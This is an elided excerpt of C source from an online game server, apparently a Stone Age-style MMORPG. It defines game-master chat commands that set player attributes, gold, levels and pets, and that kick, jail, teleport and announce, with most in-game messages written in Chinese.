...
void CHAR_CHAT_DEBUG_setmp( int charindex , char *message )
{
	...
	if(strlen(cdkey)>0){
		...
		sprintf( token, "[GM]%s把你的MP設置為%d!", CHAR_getChar( charindex, CHAR_NAME),(int)atoi(setmp)/100);
		CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
		sprintf( token, "玩傢%s的MP的設置為%d!", CHAR_getChar( i, CHAR_NAME),(int)atoi(setmp)/100);
		...
		sprintf( token, "MP設置為%d!",(int)atoi(setmp)/100);
		CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
	}
}
...
void CHAR_CHAT_DEBUG_str( int charindex , char *message )
{
	...
	if(strlen(cdkey)>0){
		...
		sprintf( token, "[GM]%s把你的腕力設置為%d!", CHAR_getChar( charindex, CHAR_NAME),(int)atoi(str)/100);
		CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
		sprintf( token, "玩傢%s的腕力設置為%d!", CHAR_getChar( i, CHAR_NAME),(int)atoi(str)/100);
		CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
	}else{
		...
		sprintf( token, "腕力設置為%d!",(int)atoi(str)/100);
		CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
	}
}
...
void CHAR_CHAT_DEBUG_tgh( int charindex , char *message )
{
	...
	if(strlen(cdkey)>0){
		...
		sprintf( token, "[GM]%s把你的耐力設置為%d!", CHAR_getChar( charindex, CHAR_NAME),(int)atoi(tgh)/100);
		CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
		sprintf( token, "玩傢%s的耐力設置為%d!", CHAR_getChar( i, CHAR_NAME),(int)atoi(tgh)/100);
		CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
	}else{
		...
		sprintf( token, "耐力設置為%d!",(int)atoi(tgh)/100);
		CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
	}
}
...
void CHAR_CHAT_DEBUG_dex( int charindex , char *message )
{
  ...
  if(strlen(cdkey)>0){
	  ...
	  if (i>=playernum)
	  {
		...
		sprintf( token, "[GM]%s把你的敏捷設置為%d!", CHAR_getChar( charindex, CHAR_NAME),(int)atoi(dex)/100);
		CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
		sprintf( token, "玩傢%s的敏捷設置為%d!", CHAR_getChar( i, CHAR_NAME),(int)atoi(dex)/100);
		CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
	}else{
		...
		sprintf( token, "敏捷設置為%d!",(int)atoi(dex)/100);
		CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
	}
}
void CHAR_CHAT_DEBUG_vital( int charindex , char *message )
{
	...
	if(strlen(cdkey)>0){
		...
		sprintf( token, "[GM]%s把你的體力設置為%d!", CHAR_getChar( charindex, CHAR_NAME),(int)atoi(vital)/100);
		CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
		sprintf( token, "玩傢%s的體力設置為%d!", CHAR_getChar( i, CHAR_NAME),(int)atoi(vital)/100);
		CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
	}else{
		...
		sprintf( token, "體力設置為%d!",(int)atoi(vital)/100);
		CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
	}
}
void CHAR_CHAT_DEBUG_luck( int charindex , char *message )
{
	...
	if(strlen(cdkey)>0){
		...
		sprintf( token, "[GM]%s把你的運氣設置為%d!", CHAR_getChar( charindex, CHAR_NAME),luck);
		CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
		sprintf( token, "玩傢%s的運氣設置為%d!", CHAR_getChar( i, CHAR_NAME),luck);
		CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
	}else{
...
void CHAR_CHAT_DEBUG_gold( int charindex , char *message )
{
	...
	if(strlen(cdkey)>0){
		...
		sprintf( token, "[GM]%s把你的金錢設置為%d!", CHAR_getChar( charindex, CHAR_NAME),money);
		CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
		sprintf( token, "玩傢%s的金錢設置為%d!", CHAR_getChar( i, CHAR_NAME),money);
		CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
	}else{
		CHAR_setInt( charindex , CHAR_GOLD , money );
		CHAR_complianceParameter( charindex );
		CHAR_send_P_StatusString( charindex , CHAR_P_STRING_GOLD);
		sprintf( token, "金錢設置為%d!",money);
		CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
	}
}
       ...
       return;
		...
		for( i = 0; i < num; i ++ ) {
			...
			if( emptyitemindexinchara < 0 ){
				sprintf( msgbuf, "玩傢%s物品欄位不足。", CHAR_getChar( j, CHAR_NAME ));
				CHAR_talkToCli( charindex, -1, msgbuf, CHAR_COLORYELLOW);
				sprintf( msgbuf, "你的%s物品欄位不足。", CHAR_getChar( j, CHAR_NAME ));
...
#endif
					"AddItem(製作道具GM)",
			       	CHAR_getInt( j,CHAR_FLOOR),
					CHAR_getInt( j,CHAR_X ),
		 	      	CHAR_getInt( j,CHAR_Y ),
	                ITEM_getChar( itemindex, ITEM_UNIQUECODE),
						ITEM_getChar( itemindex, ITEM_NAME),
						ITEM_getInt( itemindex, ITEM_ID)
	
				);
				snprintf( msgbuf,sizeof( msgbuf),"[GM]%s給你製作%s成功。",
							 CHAR_getChar( charindex, CHAR_NAME ),ITEM_getChar( itemindex, ITEM_NAME));
				CHAR_talkToCli( j, -1,msgbuf, CHAR_COLORYELLOW);
				snprintf( msgbuf, sizeof( msgbuf), "成功為%s製作 %s。",
	    ...
	    if (i>=playernum)
	     {
			...
			sprintf( token, "[GM]%s把你的人物形象設置為%d!", CHAR_getChar( charindex, CHAR_NAME),(int)atoi(metamoid));
			CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
			sprintf( token, "玩傢%s的人物形象設置為%d!", CHAR_getChar( i, CHAR_NAME),(int)atoi(metamoid));
			CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
    }else{
			...
			sprintf( token, "人物形象設置為%d!",(int)atoi(metamoid));
			CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
		}
}
...
void CHAR_CHAT_DEBUG_info( int charindex , char *message )
{
	...
	if( strlen( message) != 0 ) {
		...
		for(index=0;index<playernum;index++)
	   {
	     ...
	     if(!strcmp( CHAR_getChar( index, CHAR_CDKEY), message))
	     {
	       break;
	     }
	   }
...
void CHAR_CHAT_DEBUG_sysinfo( int charindex , char *message )
{
	...
	sprintf( msg, "GSID:%s GSNAME:%s", getGameservername(), name);
...
void CHAR_CHAT_DEBUG_announce(int charindex , char *message )
{
  ...
  int     playernum = CHAR_getPlayerMaxNum();
  char token[256];
	sprintf(token, "≮%s服務器公告≯ %s", getGameservername(), message);
...
void CHAR_CHAT_DEBUG_level( int charaindex, char* message )
{
	...
	if(strlen(cdkey)>0){
		...
		sprintf( token, "[GM]%s把你的等級設置為%d!", CHAR_getChar( charaindex, CHAR_NAME),level);
		CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
		sprintf( token, "玩傢%s的等級設置為%d!", CHAR_getChar( i, CHAR_NAME),level);
...
void CHAR_CHAT_DEBUG_exp( int charaindex, char* message )
{
	...
	if(strlen(cdkey)>0){
		...
		sprintf( token, "[GM]%s把你的經驗設置為%d!", CHAR_getChar( charaindex, CHAR_NAME),(int)atoi(exp));
		CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
		sprintf( token, "玩傢%s的經驗設置為%d!", CHAR_getChar( i, CHAR_NAME),(int)atoi(exp));
		CHAR_talkToCli( charaindex, -1,token, CHAR_COLORYELLOW );
	}else{
		CHAR_setMaxExp( charaindex, atoi( exp ));
		CHAR_send_P_StatusString( charaindex , CHAR_P_STRING_EXP);
		sprintf( token, "經驗設置為%d!",(int)atoi(exp)/100);
		CHAR_talkToCli( charaindex, -1,token, CHAR_COLORYELLOW );
	}
}
...
void CHAR_CHAT_DEBUG_delitem( int charindex , char *message )
{
	...
	if( strcmp( message, "all") == 0 ) {
		int		i;
		for( i = CHAR_STARTITEMARRAY; i < CheckCharMaxItem(charindex) ; i ++ ) {
		...
		if( equipplace < CHAR_STARTITEMARRAY || equipplace > CheckCharMaxItem(charindex) -1 ) {
...
void CHAR_CHAT_GetMap( int charaindex, char* message ){
  ...
  int		tile, obj;
	...
	{	
		char szBuffer[64];
		snprintf( szBuffer, sizeof( szBuffer ), "圖片= %d; 對象= %d",
			tile, obj );
...
void CHAR_CHAT_Map( int charaindex, char* message ){
  ...
  char  buf[16];
	...
	{	
		char szBuffer[64];
		snprintf( szBuffer, sizeof( szBuffer ), "圖片：%d => %d",	tile, fixtile );
		CHAR_talkToCli( charaindex, -1, szBuffer,  CHAR_COLORWHITE);
		snprintf( szBuffer, sizeof( szBuffer ), "對象：%d => %d",	obj, fixobj );
		CHAR_talkToCli( charaindex, -1, szBuffer,  CHAR_COLORWHITE);
	}
...
void CHAR_CHAT_Fixtile( int charaindex, char* message ){
  ...
  int		fixtile=atoi(message);
	...
	{	
		...
		snprintf( szBuffer, sizeof( szBuffer ), "圖片：%d => %d",	tile, fixtile );
		CHAR_talkToCli( charaindex, -1, szBuffer,  CHAR_COLORWHITE);
		snprintf( szBuffer, sizeof( szBuffer ), "對象：%d => %d",	obj, obj );
		CHAR_talkToCli( charaindex, -1, szBuffer,  CHAR_COLORWHITE);
	}
...
void CHAR_CHAT_Fixobj( int charaindex, char* message ){
  ...
  int		fixobj=atoi(message);
	...
	{	
		char szBuffer[64];
		snprintf( szBuffer, sizeof( szBuffer ), "圖片：%d => %d",	tile, tile );
		CHAR_talkToCli( charaindex, -1, szBuffer,  CHAR_COLORWHITE);
		snprintf( szBuffer, sizeof( szBuffer ), "對象：%d => %d",	obj, fixobj );
		CHAR_talkToCli( charaindex, -1, szBuffer,  CHAR_COLORWHITE);
	}
...
#define		CHAT_CHAT_DEBUG_SUPERMAN_PARAMDEF		100000
	...
	if(strlen(cdkey)>0){
		...
		sprintf( token, "[GM]%s把你為超人狀態!", CHAR_getChar( charaindex, CHAR_NAME));
		CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
		sprintf( token, "玩傢%s設置為超人狀態!", CHAR_getChar( i, CHAR_NAME));
		CHAR_talkToCli( charaindex, -1,token, CHAR_COLORYELLOW );
	}else{
		CHAR_setInt(charaindex,CHAR_SKILLUPPOINT, 0);
		CHAR_Skillupsend(charaindex);
		...
		CHAR_talkToCli( charaindex, -1,"設置超人狀態!", CHAR_COLORYELLOW );
	}
...
void CHAR_CHAT_DEBUG_petmake( int charaindex, char* message )
{
	...
	if(strlen(cdkey)>0){
		...
		snprintf( token,sizeof( token), "%s製作成功!",ENEMY_getChar( i, ENEMY_NAME));
...
{
	int i;
	char mess[MAXMESS_LISTNUM][256]={ "enemy", "encount", "magic", "warppoint", "petskill", "pettalk",
#ifdef _MO_RELOAD_NPC
			"npc",
#endif
			"all"};
	...
	case 6:
		if( !NPC_reloadNPC() ) {
			CHAR_talkToCli( charaindex, -1, "重新NPC資料失敗。",  CHAR_COLORRED);
		}
		if( i != ALLRESET ) break;
#endif
		break;
...
void CHAR_CHAT_DEBUG_eventsetnow( int charaindex, char* message )
{
	...
	if(find){
		...
		if( array>=event_num ){
			sprintf( token, "錯誤！！你所設的任務旗標編號已超過範圍(0~%d)。",32*event_num-1);
			CHAR_talkToCli( charaindex, -1, token, CHAR_COLORWHITE);
			return;
		}
		point = CHAR_getInt( charaindex_tmp, CHAR_NOWEVENT+array);
...
void CHAR_CHAT_DEBUG_dp( int charindex , char *message )
{
	...
	if(strlen(cdkey)>0){
		...
		sprintf( token, "[GM]%s把你的DP設置為%d!", CHAR_getChar( charindex, CHAR_NAME),(int)atoi(dp));
		CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
		sprintf( token, "玩傢%s的DP設置為%d!", CHAR_getChar( i, CHAR_NAME),(int)atoi(dp));
		CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
	}else{
		CHAR_setInt( charindex , CHAR_DUELPOINT, atoi( dp ) );
		CHAR_send_P_StatusString( charindex ,CHAR_P_STRING_DUELPOINT );
		sprintf( token, "DP設置為%d!",(int)atoi(dp));
		CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
	}
}
...
void CHAR_CHAT_DEBUG_setmerge_main( int charaindex, char* message, int mode )
{
	...
	CHAR_talkToCli( charaindex, -1, "寜嶽白仿弘及醜綜毛仄引仄凶［", CHAR_COLORWHITE);
...
void CHAR_CHAT_DEBUG_setTrans( int charaindex, char *message)
{
	...
	if(strlen(cdkey)>0){
		...
		CHAR_sendCToArroundCharacter( CHAR_getWorkInt( i, CHAR_WORKOBJINDEX ));
		sprintf( token, "[GM]%s把你轉生設置為%d轉!", CHAR_getChar( charaindex, CHAR_NAME),(int)atoi(setTrans));
		CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
		sprintf( token, "玩傢%s轉生設置為%d轉!", CHAR_getChar( i, CHAR_NAME),(int)atoi(setTrans));
		CHAR_talkToCli( charaindex, -1,token, CHAR_COLORYELLOW );
	}else{
		CHAR_setInt(charaindex, CHAR_TRANSEQUATION, 0);
		CHAR_setInt(charaindex, CHAR_TRANSMIGRATION, atoi( setTrans ));
		CHAR_sendCToArroundCharacter( CHAR_getWorkInt( charaindex, CHAR_WORKOBJINDEX ));
		sprintf( token, "轉生設置為%d轉!",(int)atoi(setTrans));
		CHAR_talkToCli( charaindex, -1,token, CHAR_COLORYELLOW );
	}
}
...
void CHAR_CHAT_DEBUG_waeikick( int charindex, char* message )
{
    ...
    if(find){
#ifdef _GM_KING
         sprintf(kctalk,"%s大魔王施展超無敵擠奶手「擠擠擠擠擠擠擠．．．．．．．把」",CHAR_getChar(charindex,CHAR_NAME));
#else
				 sprintf(kctalk,"極度大魔王施展超無敵擠奶手「擠擠擠擠擠擠擠．．．．．．．把」");
#endif
			MAX_USER=getFdnum();
       for(i=0;i<MAX_USER;i++){
           int i_use;
...
{    
    int i=0;
		...
		for( i=0; i<playernum; i++){
			...
			CONNECT_getCharname(CHAR_getWorkInt( i, CHAR_WORKFD ),charname,32);
			CONNECT_getCdkey(CHAR_getWorkInt( i, CHAR_WORKFD ),cdkey,16);
			LogCharOut(charname,cdkey,__FILE__,__FUNCTION__,__LINE__,"CHAR_CHAT_DEBUG_waeikickall函數處理");
#endif
...
void CHAR_CHAT_DEBUG_jail( int charindex, char* message )
{
     ...
     for(i=0;i<MAX_USER;i++){
      ...
      if(find){
#ifdef _GM_KING
         sprintf(kctalk,"%s大魔王施展超無敵抓奶手「抓抓抓抓抓抓．．．．．．．把」",CHAR_getChar(charindex,CHAR_NAME));
#else
				 sprintf(kctalk,"極度大魔王施展超無敵抓奶手「抓抓抓抓抓抓．．．．．．．把」");
#endif
         for(i=0;i<MAX_USER;i++){
             int i_use;
             i_use=CONNECT_getUse(i);
     ...
     for(i=0;i<MAX_USER;i++){                                                                               
         ...
         if(i_use){
            ...
            if(strcmp(token,cdkey)==0){
               ...
               snprintf( line, sizeof( line),
                         "把名稱:%s 賬號:%s 傳送到 FL=%d X=%d Y=%d",
                          szName,cdkey,fl,x,y);
                 CHAR_talkToCli( charindex, -1 , line , CHAR_COLORWHITE );
                 CHAR_talkToCli( fd_charaindex, -1 ,"＊.＊被極度大魔王傳送", CHAR_COLORWHITE );
            }                                  
         }
     }
}
...
void CHAR_CHAT_DEBUG_manorpk(int charaindex, char *message)
{
	...
	if (strcmp(cmd,"allpeace")==0) {
		...
		if ((manorid<1)||(manorid>MANORNUM)) {
			sprintf(buf,"%s","參數不正確。 id 必須在 1~10 之間。");
			CHAR_talkToCli(charaindex, -1, buf, CHAR_COLORWHITE);
			return;
		}
...
void CHAR_CHAT_DEBUG_gmreload( int charaindex, char* message )
{
	...
	else
	{
		...
		if (changeflag == 0)
		{
			snprintf(tmpbuf, sizeof(tmpbuf), "ＧＭ列錶中查無此帳號，修改失敗！");
			CHAR_talkToCli(charaindex, -1, tmpbuf, CHAR_COLORWHITE);
		}
	}
}
...
void CHAR_CHAT_DEBUG_cleanfloor( int charaindex, char *message)
{
	...
	sprintf( buf, "清除 寵物:%d隻，道具:%d個，石幣:%d個。", petnum, itemnum, goldnum);
	CHAR_talkToCli( charaindex, -1, buf, CHAR_COLORYELLOW);
	return;
}
...
void CHAR_CHAT_DEBUG_petlevelup( int charaindex, char* message )
{
	...
	if(strlen(cdkey)>0){
		...
		if( !CHAR_CHECKINDEX( petindex) ){
			sprintf( token, "玩傢%s寵物欄%d上沒寵物!", CHAR_getChar( i, CHAR_NAME),petid+1);
			CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
			return;
		}
		mylevel = CHAR_getInt( petindex, CHAR_LV);
		level = level-mylevel;
		for( j = 1; j <= level; j ++ ){	//升級
			CHAR_PetLevelUp( petindex );
			CHAR_PetAddVariableAi( petindex, AI_FIX_PETLEVELUP );
			CHAR_setInt( petindex, CHAR_LV, CHAR_getInt( petindex, CHAR_LV) +1 );
		}
		CHAR_complianceParameter( petindex );
		CHAR_setInt( petindex , CHAR_HP , CHAR_getWorkInt( petindex , CHAR_WORKMAXHP ) );
		sprintf( token, "[GM]%s把你寵物欄%d的寵物設為%d級!", CHAR_getChar( charaindex, CHAR_NAME),
																										petid+1, CHAR_getInt( petindex, CHAR_LV));
		CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
		sprintf( token, "玩傢%s的寵物欄%d的寵物設為%d級!", CHAR_getChar( i, CHAR_NAME),
																										petid+1, CHAR_getInt( petindex, CHAR_LV));
		CHAR_talkToCli( charaindex, -1,token, CHAR_COLORYELLOW );
		...
		if( !CHAR_CHECKINDEX( petindex) ){
			sprintf( token, "你的寵物欄%d上沒寵物!", petid+1);
			CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
			return;
		}
		mylevel = CHAR_getInt( petindex, CHAR_LV);
		...
		CHAR_setInt( petindex , CHAR_HP , CHAR_getWorkInt( petindex , CHAR_WORKMAXHP ) );
		sprintf( token, "把寵物欄%d的寵物設為%d級!", petid+1, CHAR_getInt( petindex, CHAR_LV));
		CHAR_talkToCli( charaindex, -1,token, CHAR_COLORYELLOW );
		CHAR_complianceParameter( petindex );
		snprintf( token, sizeof( token ), "K%d", petid );
		CHAR_sendStatusString( charaindex, token );
...
void CHAR_CHAT_DEBUG_engineer( int charindex, char *message)
{
	...
	CHAR_setInt( charindex, CHAR_LEARNRIDE, 200);
...
void CHAR_CHAT_DEBUG_show_profession( int charaindex, char*message )
{
	...
	if( strcmp(type, "restart") == 0 ){	// 重讀 profession.txt
		...
		if( strcmp(worker, "") != 0 ){
			...
			CHAR_talkToCli( charaindex, -1, "請輸入修改項目：1(職業彆) 2(職業等級) 3(職業經驗值) 4(剩馀點數)", CHAR_COLORRED);
	}

	if(  strcmp(type, "1") != 0 ){
		memset(msg, 0, sizeof(msg));
		sprintf(msg, "職業彆(%d) 職業等級(%d) 剩餘點數(%d)",
...
#ifdef _GM_KING
                snprintf( line, sizeof( line),
               		"%s大魔王將 %s 封嘴%d分鍾。",CHAR_getChar(index,CHAR_NAME),
                	CHAR_getChar( index, CHAR_NAME),
                	minu );
#else
                snprintf( line, sizeof( line),
...
void CHAR_CHAT_DEBUG_set_momentum( int charaindex, char* message )
{
	...
	if(i >= iPlayerNum){
		CHAR_talkToCli(charaindex,-1,"找不到這名玩傢",CHAR_COLORYELLOW);
		return;
	}
...
void CHAR_CHAT_DEBUG_set_manor_owner( int charindex, char* message )
{
	...
	if(atoi(szId) < 1 || atoi(szId) > MANORNUM){
		CHAR_talkToCli(charindex,-1, "莊園ID值不正確(1~10)", CHAR_COLORRED);
		return;
	}
...
void CHAR_CHAT_DEBUG_missionreload(int charindex ,char *message)
{
	...
	CHAR_talkToCli( charindex, -1, "重新讀取使者任務列錶...", CHAR_COLORYELLOW);
	if( !LoadMissionList() ) {
...
void CHAR_CHAT_DEBUG_skywalker(int charaindex ,char *message)
{
	...
	if( strstr( message, "on") != NULL )	{
		CHAR_talkToCli( charaindex, -1, "天行者模式啓動", CHAR_COLORYELLOW);
...
void CHAR_CHAT_DEBUG_supersend(int charaindex ,char *message)
{
  ...
  OBJECT  object;
	int x,y,fl,fd_charaindex; //帳號所在位置
	unsigned int MAX_USER=0;
	int sendnum = 0;
	int o,chara_index;
  ...
  for(k=0;k<MAX_USER;k++){
    ...
    if(i_use){
      ...
      if(strcmp(cdkey,cdkeytoken)==0){
						...
						while(object){
							...
							if( OBJECT_getType(o) == OBJTYPE_CHARA ){
								...
								if( CHAR_getInt( chara_index, CHAR_WHICHTYPE) == CHAR_TYPEPLAYER ){
										...
										snprintf(line,sizeof( line),"第%d個傳送[%s]",sendnum,CHAR_getChar(chara_index, CHAR_NAME));
				...
				if(sendnum<=1) CHAR_talkToCli( charaindex, -1, "  圍內沒有彆的玩傢", CHAR_COLORYELLOW);
				snprintf( line, sizeof( line),"把 name:%s account=%s 周圍%d格內的玩傢共%d個傳送到 FL=%d X=%d Y=%d",
...
void CHAR_CHAT_DEBUG_fsize( int charaindex, char* message )
{
	...
	if(strlen(cdkey)>0){
		...
		sprintf( token, "[GM]%s把你的字體設置為%d!", CHAR_getChar( charaindex, CHAR_NAME),atoi(fsize));
		CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
		sprintf( token, "玩傢%s的字體設置為%d!", CHAR_getChar( i, CHAR_NAME),(int)atoi(fsize));
		CHAR_talkToCli( charaindex, -1,token, CHAR_COLORYELLOW );
	}else{
		CHAR_setWorkInt( charaindex, CHAR_WORKFONTSIZE, atoi( fsize ));
		sprintf( token, "字體設置為%d!",(int)atoi(fsize));
		CHAR_talkToCli( charaindex, -1,token, CHAR_COLORYELLOW );
	}
}
#endif
...
void CHAR_CHAT_DEBUG_rejobdaily(int charaindex ,char *message)
{
	...
	CHAR_talkToCli( charaindex, -1, "重新讀取任務日誌列錶...", CHAR_COLORYELLOW);
	if(!LoadJobdailyfile()){
		CHAR_talkToCli( charaindex, -1, "讀取失敗", CHAR_COLORYELLOW);
		print("fail!!\n");
		return;
...
void CHAR_CHAT_DEBUG_MM( int charaindex , char *message )
{
	...
	if(index==1)enemyid=1479;
		...
		CHAR_talkToCli( charaindex, -1, "目前隻能製作1/2代瑪蕾菲雅!", CHAR_COLORYELLOW );
		return;}
...
void CHAR_CHAT_DEBUG_Sendto( int charaindex , char *message )
{
    ...
    if(!strcmp(CHAR_getChar(i,CHAR_CDKEY),cdkey))
    {
       ...
       sprintf( token, "已傳送到玩傢%s身邊！", CHAR_getChar( i, CHAR_NAME));
       CHAR_talkToCli( charaindex, -1, token, CHAR_COLORYELLOW );
       return;
     }
   }
...
void CHAR_CHAT_DEBUG_GMFUNCTION( int charindex , char *message )
{
	...
	if(strlen(cdkey)>0){
		...
		sprintf( token, "[GM]%s給你使用%s權限%d次!",CHAR_getChar( charindex, CHAR_NAME), gmfunction, atoi( gmtime ));
		CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
		sprintf( token, "相關使用請查看[help %s]無需GM密碼!",CHAR_getChar( charindex, CHAR_GMFUNCTION));
		CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
		sprintf( token, "給玩傢%s使用%s權限%d次!", CHAR_getChar( i, CHAR_NAME), gmfunction, atoi( gmtime ));
		CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
	}else{
		CHAR_setChar( charindex , CHAR_GMFUNCTION, gmfunction );
		CHAR_setInt( charindex , CHAR_GMTIME, atoi( gmtime ) );
		sprintf( token, "設置使用%s權限%d次!", gmfunction,atoi( gmtime ));
		CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
	}
}
#endif
...
void CHAR_CHAT_DEBUG_SETRIDE( int charindex , char *message )
{
	...
	{
		CHAR_talkToCli( charindex, -1,"騎寵編號必須為1~12", CHAR_COLORRED );
		return;
	}
	typedef struct{
		char name[CHARNAMELEN];
	...
	if(strlen(cdkey)>0){
		...
		sprintf( token, "[GM]%s給你騎乘騎寵%s的資格!",CHAR_getChar( charindex, CHAR_NAME), NewRides[rideindex-1].name);
		CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
		sprintf( token, "給玩傢%s騎乘騎寵%s的資格!", CHAR_getChar( i, CHAR_NAME), NewRides[rideindex-1].name);
		CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
	}else{
		...
		sprintf( token, "設置騎乘騎寵%s的資格!", NewRides[rideindex-1].name);
		CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
	}
...
void CHAR_CHAT_DEBUG_MVRIDE( int charindex , char *message )
{
	...
	if(strlen(cdkey)>0){
		...
		sprintf( token, "[GM]%s移除你騎乘騎寵%s的資格!",CHAR_getChar( charindex, CHAR_NAME), NewRides[rideindex-1].name);
		CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
		sprintf( token, "移除玩傢%s騎乘騎寵%s的資格!!", CHAR_getChar( i, CHAR_NAME), NewRides[rideindex-1].name);
		CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
	}else{
		int LRCode = CHAR_getInt( charindex, CHAR_LOWRIDEPETS);
		LRCode = LRCode^NewRides[rideindex-1].Code;
		...
		sprintf( token, "移除騎乘騎寵%s的資格!", NewRides[rideindex-1].name);
		CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
	}
	CHAR_sendStatusString( charindex, "x");
}
...
void CHAR_CHAT_DEBUG_SHOWIP( int charindex , char *message )
{
	...
	if(strlen(message)>0){
	  ...
	  d=(ip % 0x100);
		sprintf( token, "賬號%s的IP是 %d.%d.%d.%d",message, a,b,c,d);
		CHAR_talkToCli( charindex, -1,token, CHAR_COLORYELLOW );
	}
}
#endif
...
void CHAR_CHAT_DEBUG_SET_FAME( int charaindex, char* message )
{
	...
	sprintf(szMsg,"目前聲望值: %d",CHAR_getInt(i,CHAR_FAME)/100);
	CHAR_talkToCli(charaindex,-1,szMsg,CHAR_COLORYELLOW);
	sprintf(buf,"%d",id);
	fd = getfdFromCharaIndex(i);
	saacproto_ACFixFMData_send(acfd,
...
{
	char szMsg[256];
	sprintf(szMsg,"已設置PK時間為%d分鍾!",atoi(message));
	CHAR_talkToCli(charaindex,-1,szMsg,CHAR_COLORYELLOW);
...
void CHAR_CHAT_DEBUG_Trans( int charaindex, char *message)
{
	...
	if(strlen(cdkey)>0){
		...
		if(Trans>7 || CHAR_getInt(i,CHAR_LV)<80){
			sprintf( token, "由於你已七轉或等級小於80級，所以[GM]%s為你轉生失敗!", CHAR_getChar( charaindex, CHAR_NAME));
			CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
			sprintf( token, "由於玩傢%s已七轉或等級小於80級，所以%d轉生失敗!", CHAR_getChar( i, CHAR_NAME),Trans);
			CHAR_talkToCli( charaindex, -1,token, CHAR_COLORYELLOW );
			return;
		}else{
			CHAR_sendCToArroundCharacter( CHAR_getWorkInt( i, CHAR_WORKOBJINDEX ));
			sprintf( token, "[GM]%s為你轉生%d轉!", CHAR_getChar( charaindex, CHAR_NAME),Trans);
			CHAR_talkToCli( i, -1, token, CHAR_COLORYELLOW );
			sprintf( token, "為玩傢%s轉生為%d轉!", CHAR_getChar( i, CHAR_NAME),Trans);
			CHAR_talkToCli( charaindex, -1,token, CHAR_COLORYELLOW );
			charaindex=i;
		}
	}else{
		...
		if(Trans>7 || CHAR_getInt(charaindex,CHAR_LV)<80){
			sprintf( token, "由於你已七轉或等級小於80級，所以轉生失敗!");
			CHAR_talkToCli( charaindex, -1, token, CHAR_COLORYELLOW );
			return;
		}else{
			CHAR_sendCToArroundCharacter( CHAR_getWorkInt( charaindex, CHAR_WORKOBJINDEX ));
			sprintf( token, "為自己轉生為%d轉!",Trans);
			CHAR_talkToCli( charaindex, -1,token, CHAR_COLORYELLOW );
		}
	}
...
void CHAR_CHAT_DEBUG_petmakeabi( int charaindex, char* message )
{
	...
	int	i;
	char buf[10];
	int vital,str,tough,dex, level, trans;
	char token[128];
	easyGetTokenFromString( message , 1 , buf, sizeof(buf));
	enemyid=atoi(buf);
	easyGetTokenFromString( message , 2 , buf, sizeof(buf));
...
void CHAR_CHAT_DEBUG_PlayerQuestion( int charaindex, char* message )
{
	char tmp[64];
	char token[128];
	char type[5][32]={"石幣","道具","寵物","聲望","積分"};
	if(getStringFromIndexWithDelim(message," ",1, PlayerQuestion.question, sizeof(PlayerQuestion.question))== FALSE){
		CHAR_talkToCli( charaindex, -1, "請輸入你的問題!",  CHAR_COLORRED);
	}
	if(getStringFromIndexWithDelim(message," ",2, PlayerQuestion.result, sizeof(PlayerQuestion.result))== FALSE){
		CHAR_talkToCli( charaindex, -1, "請輸入你的問題答案!",  CHAR_COLORRED);
	}
	if(getStringFromIndexWithDelim(message," ",3, tmp, sizeof(tmp))== FALSE){
		CHAR_talkToCli( charaindex, -1, "請輸入你的奬品類型(0為石幣,1為道具,2為寵物,3為聲望,4為積分!",  CHAR_COLORRED);
	}else{
		PlayerQuestion.type = min(max(0, atoi(tmp)), 4);
	}
	if(getStringFromIndexWithDelim(message," ",4, tmp, sizeof(tmp))== FALSE){
		sprintf(token, "請輸入你的奬品%s數量!", type[PlayerQuestion.type]);
	...
	
	{
	  ...
	  sprintf(question, "[GM]在綫問題――%s", PlayerQuestion.question);
		...
		for( i = 0 ; i < playernum ; i++) {
		  if( CHAR_getCharUse(i) != FALSE ){
		  	CHAR_talkToCli( i, -1, question, CHAR_COLORRED);
		  	CHAR_talkToCli( i, -1, token, CHAR_COLORRED);
			}
		}
	}
...
{
  int i;
	CHAR_talkToCli( charaindex, -1, "正在保存數據,請稍後~",  CHAR_COLORRED);
